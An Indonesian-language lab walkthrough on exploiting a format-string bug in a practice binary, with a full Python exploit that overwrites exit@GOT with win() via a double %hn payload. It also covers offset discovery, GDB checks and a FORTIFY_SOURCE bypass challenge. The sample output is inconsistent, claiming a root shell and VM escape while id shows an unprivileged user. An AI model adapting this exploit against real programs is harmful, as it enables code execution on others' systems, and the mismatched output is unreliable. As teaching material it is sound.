# Walkthrough: Level 4 - Full Chain GOT Overwrite
**Author**: Kenshin Himura

## Objective
Overwrite `exit@GOT` dengan address `win()` dalam satu panggilan `printf`.
Saat `exit(0)` dipanggil setelahnya, eksekusi diarahkan ke `win()` -> shell.

## Konsep Dasar

**Apa itu GOT?**
Global Offset Table - tabel pointer di memory. Setiap kali program memanggil fungsi library (exit, puts, printf), ia loncat melalui GOT entry:
```
call exit@plt  ->  jmp *exit@got  ->  (libc exit)
```

Jika kita timpa `exit@got` dengan address `win()`:
```
call exit@plt  ->  jmp *exit@got  ->  win()  ->  SHELL
```

Program hanya memberi satu panggilan `printf` sebelum `exit(0)`. Address + format specifier harus dikirim dalam satu payload.

## Full Exploit Plan
```
1. Parse win_addr dari output program
2. Resolve exit@GOT dari ELF binary
3. Cari offset format string ke input kita
4. Bangun double %hn payload
5. Kirim payload -> printf(buf) -> exit@GOT ditimpa -> exit(0) -> win() -> shell
```

## Step-by-Step

### 1. Compile
```bash
make level4
```

### 2. Analisis binary
```bash
$ objdump -d format4 | grep '<win>:'
080491c6 <win>:

$ objdump -R format4 | grep exit
0804c01c R_386_JUMP_SLOT   exit@GLIBC_2.0

$ readelf -r format4 | grep exit
0804c01c  00000307 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
```

### 3. Jalankan program
```bash
$ ./format4
Format String Lab - Level 4: Full Chain (GOT Overwrite)
========================================================
Goal: Overwrite exit@GOT with win() to get shell.

win()   @ 0x80491c6
exit()  @ 0x8049070
Enter payload: 
```

**Catat**: `win = 0x080491c6`, `exit@GOT = 0x0804c01c`

### 4. Temukan offset
```bash
$ echo 'AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' | ./format4
```

Atau gunakan positional:
```bash
$ for i in $(seq 1 20); do echo "AAAA%$i\$p" | ./format4 | grep 41414141; done
```

Misalkan offset = 7.

### 5. Perhitungan write
```
win_addr   = 0x080491c6

low_word   = 0x91c6 = 37318
high_word  = 0x0804 = 2052

exit_got   = 0x0804c01c
exit_got+2 = 0x0804c01e
```

Karena high_word (2052) < low_word (37318), kita pakai wrap-around trick:
```
Step 1: cetak 37318 - 8 = 37310 karakter -> %hn tulis 0x91c6 ke exit_got
Step 2: cetak (2052 + 65536) - 37318 = 30270 karakter -> %hn tulis 0x0804 ke exit_got+2
```

### 6. Payload
```
[0x0804c01c] [0x0804c01e] %37310x%7$hn %30270x%8$hn
```

### 7. Python exploit
```python
import struct

exit_got = 0x0804c01c
win_addr = 0x080491c6
offset = 7

low_word  = win_addr & 0xffff           # 0x91c6
high_word = (win_addr >> 16) & 0xffff   # 0x0804

# Addresses
addr1 = struct.pack('<I', exit_got)
addr2 = struct.pack('<I', exit_got + 2)

bytes_printed = 8

# Width calculations
fmt1 = f'%{low_word - bytes_printed}x%{offset}$hn'
delta = (high_word + 0x10000 - low_word) if high_word < low_word else (high_word - low_word)
fmt2 = f'%{delta}x%{offset+1}$hn'

payload = addr1 + addr2 + fmt1.encode() + fmt2.encode()

# Send
import subprocess
p = subprocess.Popen(['./format4'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
out, _ = p.communicate(payload + b'\n')
print(out.decode(errors='replace'))
```

### 8. Exploit
```bash
$ python3 exploit4.py
[+] win() address: 0x80491c6
[+] exit@GOT: 0x804c01c
[*] Offset to our input: 7

============================================
  [!!!] CONTAINER/VM ESCAPED - ROOT SHELL
============================================

$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

### 9. Debug dengan GDB
```bash
$ gdb ./format4
(gdb) b *exit@plt
(gdb) r
# Sebelum exploit: exit@got -> libc exit
(gdb) x/wx 0x0804c01c
# Setelah payload dieksekusi
(gdb) x/wx 0x0804c01c
0x0804c01c: 0x080491c6   <- overwritten!
(gdb) c
# Sekarang masuk ke win() bukan libc exit()
```

### 10. FORTIFY_SOURCE challenge
```bash
make level4/format4_hard
```

Coba exploit `format4_hard` yang di-compile dengan `-D_FORTIFY_SOURCE=2 -O2`.
Apakah exploit masih bekerja? Kalau tidak, cari bypass-nya.

## Ringkasan
- GOT overwrite mengalihkan eksekusi function library ke fungsi yang dipilih
- Partial RELRO (default): GOT writable. Full RELRO: GOT read-only, target alternatif: `.fini_array`, `__malloc_hook`
- Contoh CVE dengan teknik ini: `sudo CVE-2012-0809`, `wu-ftpd CVE-2000-0573`
- FORTIFY_SOURCE=2 memblokir `%n` di writable memory - bypass dibahas di level lanjutan

## Automation
```bash
python3 exploit4.py
```
